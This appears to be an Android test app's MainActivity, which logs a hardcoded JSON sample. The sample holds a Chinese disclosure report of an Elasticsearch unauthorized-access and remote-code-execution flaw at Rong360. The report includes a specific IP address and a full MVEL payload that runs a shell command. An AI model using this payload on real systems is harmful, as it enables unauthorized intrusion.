package com.hellofyc.apptest;

import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

import com.hellofyc.applib.app.activity.BaseActivity;
import com.hellofyc.applib.util.FLog;

public class MainActivity extends BaseActivity {

    private TextView mTextView;
    private Button mBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mTextView = (TextView) findViewById(R.id.view);
        mBtn = (Button) findViewById(R.id.btn);

//        Drawable drawable = getDrawableCompat(R.drawable.ic_account_circle_24dp);
//
//        mBtn.setOnClickListener(v -> {
//
//            List<String> list = new ArrayList<>();
//            list.add("item1");
//            list.add("item2");
//            list.add("item3");
//
//            Stream.iterate(1, item -> item + 1).limit(10).forEach(System.out::print);
//
////            Stream.of(list).filter(item -> !item.equals("item1")).forEach(item -> FLog.i(item));
//            List<String> splitUpNames = Arrays.asList("John Woo", "Jeff Dean", "Josh Bloch", "Josh Long");
//            System.out.print(Stream.of(splitUpNames).map(name -> name.split(" ")).collect(Collectors.toList()).listIterator(0));
//            FLog.i(Stream.of(splitUpNames).map(name -> name.split(" ")).collect(Collectors.toList()).listIterator(0))
//        });

        FLog.json("{\"code\":1,\"data\":{\"add_time\":\"2015-12-01 20:59:32\",\"company\":\"融360\",\"content\":\"<style>\\nimg {max-width: 100%;height: auto;width: auto;}\\npre {white-space: pre-wrap;word-wrap: break-word;}\\n</style>\\n</head>\\n<div style=\\\"overFlow-x:hidden; word-break:break-all; padding:12px 6px 12px 6px; font-size:16px;\\\"><p style=\\\"border-width: 0px; padding: 0px; margin: 0px 0px 8px; list-style: none; text-indent: 2em; color: rgb(51, 51, 51); font-family: 宋体; font-size: 14px; line-height: 28px;\\\">ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。</p><p style=\\\"border-width: 0px; padding: 0px; margin: 0px 0px 8px; list-style: none; text-indent: 2em; color: rgb(51, 51, 51); font-family: 宋体; font-size: 14px; line-height: 28px;\\\">ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。</p><p style=\\\"border-width: 0px; padding: 0px; margin: 0px 0px 8px; list-style: none; text-indent: 2em; color: rgb(51, 51, 51); font-family: 宋体; font-size: 14px; line-height: 28px;\\\">而在ElasticSearch里，默认配置是打开动态脚本功能的，因此用户可以直接通过http请求，执行任意代码。</p><pre class=\\\"prettyprint lang-html\\\">Elasticsearch 未授权访问漏洞\\n59.151.86.7:9200/_status\\n\\n59.151.86.7:9200/_cluster/health\\n\\n59.151.86.7:9200/_nodes\\n\\nElasticsearch Remote Code Execution\\n\\n59.151.86.7:9200/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D</pre><p>证明一下这个IP,估计是走防火墙了，反正在一个网段。</p><p><img src=\\\"http://p0.qhimg.com/t01e03d77291688a35b.png\\\" alt=\\\"\\\" /><img src=\\\"http://p0.qhimg.com/t01486dc1a24412e8fa.png\\\" alt=\\\"\\\" /><br /></p><p><img src=\\\"http://p0.qhimg.com/t0139c3e31bf4c14924.png\\\" alt=\\\"\\\" /></p><p><img src=\\\"http://p0.qhimg.com/t013b915f395daf837d.png\\\" alt=\\\"\\\" /></p><p><img src=\\\"http://p0.qhimg.com/t01031d361f77d8c590.png\\\" alt=\\\"\\\" /></p><p>&nbsp;<br /></p></div>\",\"is_event\":\"1\",\"is_hide\":\"0\",\"level\":\"1\",\"pub_time\":\"2015-12-05 13:16:30\",\"qid\":\"QTVA-2015-337493\",\"state\":1,\"title\":\"融360存在ElasticSearch 三处未授权访问+远程代码执行漏洞\",\"type\":\"代码执行\"},\"msg\":\"获取成功\",\"success\":true}");
    }
}
